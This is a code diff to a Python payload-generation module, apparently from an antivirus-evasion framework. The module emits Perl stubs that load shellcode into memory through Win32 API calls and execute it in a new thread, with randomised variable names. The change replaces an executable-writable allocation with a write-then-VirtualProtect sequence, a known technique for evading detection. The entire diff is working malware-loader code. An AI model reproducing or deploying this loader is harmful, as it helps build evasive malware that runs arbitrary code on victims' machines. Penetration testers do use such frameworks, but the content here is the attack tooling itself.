@@ -79,6 +79,8 @@ class PayloadModule:
         rand_heapcreate = evasion_helpers.randomString()
         rand_heapalloc = evasion_helpers.randomString()
         rand_thread = evasion_helpers.randomString()
+        rand_protect = evasion_helpers.randomString()
+        protect_out = evasion_helpers.randomString()
 
         payload_code += '\t' * num_ends_required + "my $%s = \"%s\";\n" % (shellcode_variable, Shellcode)
         payload_code += '\t' * num_ends_required + "$" + rand_movemem + " = new Win32::API('kernel32', 'RtlMoveMemory', 'IPI', 'V');\n"
@@ -87,7 +89,10 @@ class PayloadModule:
 
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += '\t' * num_ends_required + "$" + rand_valloc + " = new Win32::API('kernel32', 'VirtualAlloc', 'IIII', 'I');\n"
-            payload_code += '\t' * num_ends_required + "my $" + ptrName + " = $" + rand_valloc + "->Call(0, length($" + shellcode_variable + "), 0x1000, 0x40);\n"
+            payload_code += '\t' * num_ends_required + "$" + rand_protect + " = new Win32::API('kernel32', 'VirtualProtect', 'PIIP', 'I');\n"
+            payload_code += '\t' * num_ends_required + "my $" + ptrName + " = $" + rand_valloc + "->Call(0, length($" + shellcode_variable + "), 0x1000, 0x04);\n"
+            payload_code += '\t' * num_ends_required + "$" + rand_movemem + "->Call($%s, $%s, length($%s));\n" % (ptrName, shellcode_variable, shellcode_variable)
+            payload_code += '\t' * num_ends_required + "my $" + protect_out + " = $" + rand_protect + "->Call(" + ptrName + ", length($" + shellcode_variable + "), 0x20, 0);\n"
 
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
             rand_heapcrout = evasion_helpers.randomString()
@@ -95,8 +100,8 @@ class PayloadModule:
             payload_code += '\t' * num_ends_required + "$" + rand_heapalloc + " = new Win32::API('kernel32', 'HeapAlloc', 'III', 'I');\n"
             payload_code += '\t' * num_ends_required + "my $" + rand_heapcrout + " = $" + rand_heapcreate + "->Call(0x00040000, length(" + shellcode_variable + ")*2, 0);\n"
             payload_code += '\t' * num_ends_required + "my $" + ptrName + " = $" + rand_heapalloc + "->Call($" + rand_heapcrout + ", 0x00000008, length(" + shellcode_variable + "));\n"
+            payload_code += '\t' * num_ends_required + "$" + rand_movemem + "->Call($%s, $%s, length($%s));\n" % (ptrName, shellcode_variable, shellcode_variable)
 
-        payload_code += '\t' * num_ends_required + "$" + rand_movemem + "->Call($%s, $%s, length($%s));\n" % (ptrName, shellcode_variable, shellcode_variable )
         payload_code += '\t' * num_ends_required + "my $" + rand_thread + " = $" + rand_cthread + "->Call(0, 0, $%s, 0, 0, 0);\n" % (ptrName)
         payload_code += '\t' * num_ends_required + "$" + rand_waitfor + "->Call($" + rand_thread + ", -1);\n"
         payload_code += '}\n' * num_ends_required
